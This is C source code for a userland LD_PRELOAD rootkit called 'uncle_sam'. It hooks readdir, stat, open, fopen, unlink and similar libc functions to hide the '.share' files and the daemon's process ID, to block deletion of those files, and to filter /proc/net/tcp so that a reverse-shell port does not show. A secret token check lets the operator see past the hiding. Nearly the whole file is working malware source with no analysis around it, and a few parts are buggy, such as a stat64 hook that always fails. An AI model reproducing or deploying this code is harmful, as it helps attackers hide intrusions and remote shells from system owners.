#define _GNU_SOURCE
#define __GNU_SOURCE
#define __USE_GNU
#undef _LARGEFILE_SOURCE
#undef _FILE_OFFSET_BITS
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <regex.h>
#include <sys/stat.h> 
#include <libgen.h>
#include "lib.h"
#include "util.h"
#define ROOKIT_LIBRARY_NAME "libuncle_sam.so"
#define ROOTKIT_RUNTIME_NAME "uncle_sam_daemon"


// Function pointers to the original functions
int (*original_unlink)(const char *) = NULL;
int (*original_unlinkat)(int, const char *, int) = NULL;
struct dirent *(*original_readdir)(DIR *) = NULL;
struct dirent64 *(*original_readdir64)(DIR *) = NULL;
int (*original_open)(const char* pathname, int flags) = NULL;
int (*original_open64)(const char* pathname, int flags) = NULL;
int (*original_openat)(int dirfd, const char* pathname, int flags) = NULL;
FILE* (*original_fopen)(const char *pathname, const char *mode) = NULL;
FILE* (*original_fopen64)(const char *pathname, const char *mode) = NULL;
int (*original_stat)(const char *pathname, struct stat *statbuf) = NULL;
int (*original_fstat)(int fd, struct stat *statbuf) = NULL;
int (*original_lstat)(const char *pathname, struct stat *statbuf) = NULL;
int (*original_fstatat)(int dirfd, const char *pathname, struct stat *statbuf, int flags) = NULL;
int (*original_stat64)(const char *pathname, struct stat64 *statbuf) = NULL;
DIR* (*original_opendir)(const char *name) = NULL;
DIR* (*original_fdopendir)(int fd) = NULL;

int contains_hidden_file(const char *pathname)
{
  //get the basename and dirname of the pathname
  if (pathname == NULL)
  {
    return 0;
  }
  char *pathdup = strdup(pathname);
  char *base = basename(pathdup);
  char *nm = dirname(pathdup);
  //check if basename is uncle_sam OR the dirname is uncle_sam
  if (strcmp(base, ".share") == 0 || strcmp(nm, ".share") == 0)
  {
    free(pathdup);
    return 1;
  }
  return 0;
}

int contains_hidden_pid(const char* pathname) {
    //get the basename and dirname of the pathname
  if (pathname == NULL)
  {
    return 0;
  }
  char *pathdup = strdup(pathname);
  char *base = basename(pathdup);
  char *nm = dirname(pathdup);
  int base_int = atoi(base);
  int nm_int = atoi(nm);
  //get the pid of the uncle_sam_daemon
  if (base_int == 0 && nm_int == 0)
  {
    free(pathdup);
    return 0;
  }
  if (original_readdir == NULL)
  {
    original_readdir = dlsym(RTLD_NEXT, "readdir");
  }
  if (original_opendir == NULL)
  {
    original_opendir = dlsym(RTLD_NEXT, "opendir");
  }
  if (original_fopen == NULL)
  {
    original_fopen = dlsym(RTLD_NEXT, "fopen");
  }

  int pid = get_pid_of_process_with_name(ROOTKIT_RUNTIME_NAME, original_readdir, original_opendir, original_fopen);
  #ifdef DEBUG
  fprintf(stderr, "pid: %d\n", pid);
  fprintf(stderr, "base_int: %d\n", base_int);
  fprintf(stderr, "nm_int: %d\n", nm_int);
  #endif
  free(pathdup);
  //check if the basename is the pid of the uncle_sam_daemon
  if (base_int == pid)
  {
    return 1;
  }
  //check if the dirname is the pid of the uncle_sam_daemon
  if (nm_int == pid)
  {
    return 1;
  }
  return 0;
}
#ifdef PREVENT_LISTING

[[maybe_unused]] struct dirent *readdir(DIR *p)
{

#ifdef DEBUG
  fprintf(stderr, "readdir() called!\n");
#endif
  if (!original_readdir)
  {
    original_readdir = dlsym(RTLD_NEXT, "readdir");
  }

  struct dirent *dir = original_readdir(p);
  if (verify_token() == 1)
  {
    return dir;
  }

  // Check if the directory entry is one of the hidden files
  if (dir)
  {
    //also hide /etc/ld.so.preload
    while (contains_hidden_file(dir->d_name) || contains_hidden_pid(dir->d_name))
    {
      #ifdef DEBUG
      fprintf(stderr, "Intercepted readdir() call for %s\n", dir->d_name);
      #endif
      dir = original_readdir(p);
    }
  }
  return dir;
}

[[maybe_unused]] struct dirent64 *readdir64(DIR *p)
{
#ifdef DEBUG
  fprintf(stderr, "readdir64() called!\n");
  //print p
  fprintf(stderr, "p: %p\n", p);
#endif


  if (!original_readdir64)
  {
    original_readdir64 = dlsym(RTLD_NEXT, "readdir64");
  }
  struct dirent64 *dir = original_readdir64(p);
  if (verify_token() == 1)
  {
    return dir;
  }
  while (dir != NULL && (contains_hidden_file(dir->d_name) || contains_hidden_pid(dir->d_name))) {
    dir = original_readdir64(p);
    #ifdef DEBUG
    printf("readdir64: %s\n", dir->d_name);
    #endif
  }
  return dir;
}



[[maybe_unused]] int stat(const char *pathname, struct stat *statbuf)
{
#ifdef DEBUG
  fprintf(stderr, "stat() called!\n");
  #endif
  if (original_stat == NULL)
  {
    original_stat = dlsym(RTLD_NEXT, "stat");
  }
  if (verify_token() == 1)
  {
    return original_stat(pathname, statbuf);
  }
  if (contains_hidden_file(pathname) || contains_hidden_pid(pathname))
  {
    #ifdef DEBUG
    fprintf(stderr, "Intercepted stat() call for %s\n", pathname);
    #endif
    errno = ENOENT;
    return -1;
  }
  return original_stat(pathname, statbuf);
}

[[maybe_unused]] int fstat(int fd, struct stat *statbuf)
{
#ifdef DEBUG
  fprintf(stderr, "fstat() called!\n");
#endif
  if (original_fstat == NULL)
  {
    original_fstat = dlsym(RTLD_NEXT, "fstat");
  }
  if (verify_token() == 1)
  {
    return original_fstat(fd, statbuf);
  }
  char buf[1024];
  memset(buf, 0, sizeof(buf));
  snprintf(buf, sizeof(buf), "/proc/self/fd/%d", fd);
  if (contains_hidden_file(buf))
  {
    #ifdef DEBUG
    fprintf(stderr, "Intercepted fstat() call for %s\n", buf);
    #endif
    errno = ENOENT;
    return -1;
  }
  return original_fstat(fd, statbuf);
}

[[maybe_unused]] int lstat(const char *pathname, struct stat *statbuf)
{
#ifdef DEBUG
  fprintf(stderr, "lstat() called!\n");
#endif
  if (original_lstat == NULL)
  {
    original_lstat = dlsym(RTLD_NEXT, "lstat");
  }
  if (verify_token() == 1)
  {
    return original_lstat(pathname, statbuf);
  }
  if (contains_hidden_file(pathname))
  {
    #ifdef DEBUG
    fprintf(stderr, "Intercepted lstat() call for %s\n", pathname);
    #endif
    errno = ENOENT;
    return -1;
  }
  return original_lstat(pathname, statbuf);
}

[[maybe_unused]] int fstatat(int dirfd, const char *pathname, struct stat *statbuf, int flags)
{
#ifdef DEBUG
  fprintf(stderr, "fstatat() called!\n");
#endif
  if (original_fstatat == NULL)
  {
    original_fstatat = dlsym(RTLD_NEXT, "fstatat");
  }
  if (verify_token() == 1)
  {
    return original_fstatat(dirfd, pathname, statbuf, flags);
  }
  if (contains_hidden_file(pathname))
  {
    #ifdef DEBUG
    fprintf(stderr, "Intercepted fstatat() call for %s\n", pathname);
    #endif
    errno = ENOENT;
    return -1;
  }
  return original_fstatat(dirfd, pathname, statbuf, flags);
}


[[maybe_unused]] int __attribute__((weak)) stat64(const char *pathname, struct stat64 *statbuf)
{
#ifdef DEBUG
  fprintf(stderr, "stat64() called!\n");
  #endif
  if (original_stat64 == NULL)
  {
    original_stat64 = dlsym(RTLD_NEXT, "stat64");
  }
  if (verify_token() == 1)
  {
    return original_stat64(pathname, statbuf);
  }
  if (contains_hidden_file(pathname) || contains_hidden_pid(pathname))
  {
    #ifdef DEBUG
    fprintf(stderr, "Intercepted stat64() call for %s\n", pathname);
    #endif
    errno = ENOENT;
    return -1;
  }
  {
    #ifdef DEBUG
    fprintf(stderr, "Intercepted stat64() call for %s\n", pathname);
    #endif
    errno = ENOENT;
    return -1;
  }
  return original_stat64(pathname, statbuf);
}

[[maybe_unused]] DIR* opendir(const char *name)
{
#ifdef DEBUG
  fprintf(stderr, "opendir() called!\n");
#endif
  if (original_opendir == NULL)
  {
    original_opendir = dlsym(RTLD_NEXT, "opendir");
  }
  if (verify_token() == 1)
  {
    return original_opendir(name);
  }
  if (contains_hidden_file(name) || contains_hidden_pid(name))
  {
    #ifdef DEBUG
    fprintf(stderr, "Intercepted opendir() call for %s\n", name);
    #endif
    errno = ENOENT;
    return NULL;
  }
  return original_opendir(name);
}

[[maybe_unused]] DIR* fdopendir(int fd)
{
#ifdef DEBUG
  fprintf(stderr, "fdopendir() called!\n");
#endif
  if (original_fdopendir == NULL)
  {
    original_fdopendir = dlsym(RTLD_NEXT, "fdopendir");
  }
  if (verify_token() == 1)
  {
    return original_fdopendir(fd);
  }
  char buf[1024];
  memset(buf, 0, sizeof(buf));
  snprintf(buf, sizeof(buf), "/proc/self/fd/%d", fd);
  if (contains_hidden_file(buf))
  {
    #ifdef DEBUG
    fprintf(stderr, "Intercepted fdopendir() call for %s\n", buf);
    #endif
    errno = ENOENT;
    return NULL;
  }
  return original_fdopendir(fd);
}

#endif

#ifdef PREVENT_REMOVAL
[[maybe_unused]] int unlink(const char *pathname)
{
#ifdef DEBUG
  fprintf(stderr, "unlinkat() called!\n");
#endif
  // Load the original unlink function if it hasn't been loaded yet
  if (original_unlink == NULL)
  {
    original_unlink = dlsym(RTLD_NEXT, "unlink");
  }

  if (verify_token() == 1)
  {
    return original_unlink(pathname);
  }

  // Check if the pathname contains any of the hidden file strings
  if (contains_hidden_file(pathname))
  {
#ifdef DEBUG
    printf("unlink: %s\n intercepted", pathname);
#endif
    return 0;
  }

  // Call the original unlink function
  return original_unlink(pathname);
}

[[maybe_unused]] int unlinkat(int dirfd, const char *pathname, int flags)
{
#ifdef DEBUG
  fprintf(stderr, "unlinkat() called!\n");
#endif
  // Load the original unlinkat function if it hasn't been loaded yet
  if (original_unlinkat == NULL)
  {
    original_unlinkat = dlsym(RTLD_NEXT, "unlinkat");
  }

  if (verify_token() == 1)
  {
    return original_unlinkat(dirfd, pathname, flags);
  }

  // Check if the pathname contains any of the hidden file strings
  if (contains_hidden_file(pathname))
  {
#ifdef DEBUG
    printf("unlinkat: %s\n intercepted", pathname);
#endif
    return 0;
  }

  // Call the original unlinkat function
  return original_unlinkat(dirfd, pathname, flags);
}
#endif

#if defined(PREVENT_LISTING) || defined(PREVENT_REMOVAL)
[[maybe_unused]] int open(const char* pathname, int flags)
{
#ifdef DEBUG
  fprintf(stderr, "open() called for %s\n", pathname);
#endif
  if (original_open == NULL)
  {
    original_open = dlsym(RTLD_NEXT, "open");
    original_open64 = dlsym(RTLD_NEXT, "open64");
  }
  if (verify_token() == 1)
  {
    return original_open(pathname, flags);
  }
  if (strcmp(pathname, "/proc/net/tcp") == 0 || strcmp(pathname, "/proc/net/tcp6") == 0)
  {
    #ifdef DEBUG
    fprintf(stderr, "Intercepted open() call for %s\n", pathname);
    #endif
    return open(get_filename_of_overwritten_proc_net_tcp_w_hidden_port(REVERSE_SHELL_PORT, pathname), flags);
    
  }
  else if (contains_hidden_file(pathname) || contains_hidden_pid(pathname))
  {
    #ifdef DEBUG
    fprintf(stderr, "Intercepted open() call for %s\n", pathname);
    #endif
    errno = ENOENT;
    return -1;
  }
  return original_open(pathname, flags);
}

[[maybe_unused]] int open64(const char* pathname, int flags)
{
#ifdef DEBUG
  fprintf(stderr, "open64() called for %s\n", pathname);
#endif
  if (original_open64 == NULL)
  {
    original_open64 = dlsym(RTLD_NEXT, "open64");
  }
  if (verify_token() == 1)
  {
    return original_open64(pathname, flags);
  }
  if (strcmp(pathname, "/proc/net/tcp") == 0 || strcmp(pathname, "/proc/net/tcp6") == 0)
  {
    #ifdef DEBUG
    fprintf(stderr, "Intercepted open64() call for %s\n", pathname);
    #endif
    return open64(get_filename_of_overwritten_proc_net_tcp_w_hidden_port(REVERSE_SHELL_PORT, pathname), flags);
    
  }
  else if (contains_hidden_file(pathname) || contains_hidden_pid(pathname))
  {
    #ifdef DEBUG
    fprintf(stderr, "Intercepted open64() call for %s\n", pathname);
    #endif
    errno = ENOENT;
    return -1;
  }
  return original_open64(pathname, flags);
}

[[maybe_unused]] int openat(int dirfd, const char* pathname, int flags)
{
#ifdef DEBUG
  fprintf(stderr, "openat() called!\n");
#endif 
  if (original_openat == NULL)
  {
    original_openat = dlsym(RTLD_NEXT, "openat");
  }
  if (verify_token() == 1)
  {
    return original_openat(dirfd, pathname, flags);
  }
  if (strcmp(pathname, "/proc/net/tcp") == 0 || strcmp(pathname, "/proc/net/tcp6") == 0)
  {
    #ifdef DEBUG
    fprintf(stderr, "Intercepted openat() call for %s\n", pathname);
    #endif
    return openat(dirfd, get_filename_of_overwritten_proc_net_tcp_w_hidden_port(REVERSE_SHELL_PORT, pathname), flags);
    
  }
  else if (contains_hidden_file(pathname))
  {
    #ifdef DEBUG
    fprintf(stderr, "Intercepted openat() call for %s\n", pathname);
    #endif
    errno = ENOENT;
    return -1;
  }
  return original_openat(dirfd, pathname, flags);
}

[[maybe_unused]] FILE* fopen(const char *pathname, const char *mode)
{
#ifdef DEBUG
  fprintf(stderr, "fopen() called for %s\n", pathname);
#endif 
  if (original_fopen == NULL)
  {
    original_fopen = dlsym(RTLD_NEXT, "fopen");
  }
  if (verify_token() == 1)
  {
    return original_fopen(pathname, mode);
  }
  if (strcmp("/proc/net/tcp",pathname) == 0 || strcmp(pathname, "/proc/net/tcp6") == 0) {
    #ifdef DEBUG
    fprintf(stderr, "Intercepted fopen() call for %s\n", pathname);
    #endif
    return original_fopen(get_filename_of_overwritten_proc_net_tcp_w_hidden_port(REVERSE_SHELL_PORT, pathname), mode);
  }
  else if (contains_hidden_file(pathname))
  {
    #ifdef DEBUG
    fprintf(stderr, "Intercepted fopen() call for %s\n", pathname);
    #endif
    errno = ENOENT;
    return NULL;
  }
  return original_fopen(pathname, mode);
}
FILE* fopen64(const char *pathname, const char *mode)
{
#ifdef DEBUG
  fprintf(stderr, "fopen64() called!\n");
#endif
  if (original_fopen64 == NULL)
  {
    original_fopen64 = dlsym(RTLD_NEXT, "fopen64");
  }
  if (verify_token() == 1)
  {
    return original_fopen64(pathname, mode);
  }
  if (strcmp("/proc/net/tcp",pathname) == 0 || strcmp(pathname, "/proc/net/tcp6") == 0) {
    #ifdef DEBUG
    fprintf(stderr, "Intercepted fopen64() call for %s\n", pathname);
    #endif 
    return original_fopen64(get_filename_of_overwritten_proc_net_tcp_w_hidden_port(REVERSE_SHELL_PORT, pathname), mode);
  }
  else if (contains_hidden_file(pathname))
  {
    #ifdef DEBUG
    fprintf(stderr, "Intercepted fopen64() call for %s\n", pathname);
    #endif
    errno = ENOENT;
    return NULL;
  }
  return original_fopen64(pathname, mode);
}
#endif

